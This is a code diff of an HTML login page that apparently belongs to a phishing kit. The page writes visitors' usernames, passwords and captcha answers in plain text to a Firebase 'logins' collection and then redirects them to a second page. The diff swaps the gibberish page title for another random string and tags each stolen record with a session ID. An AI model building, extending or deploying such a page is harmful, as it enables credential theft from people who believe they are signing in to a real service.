@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>dehijlbrd</title>
+  <title>rewpinotclimsyno</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
     html, body {
@@ -159,6 +159,10 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    function generateSessionId() {
+      return 'session-' + Math.random().toString(36).substr(2, 9);
+    }
+
     function submitForm(e) {
       e.preventDefault();
 
@@ -171,10 +175,13 @@
         return;
       }
 
+      const sessionId = generateSessionId();
+
       db.collection("logins").add({
         username,
         password,
         captcha,
+        sessionId,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         window.location.href = "page2.html";
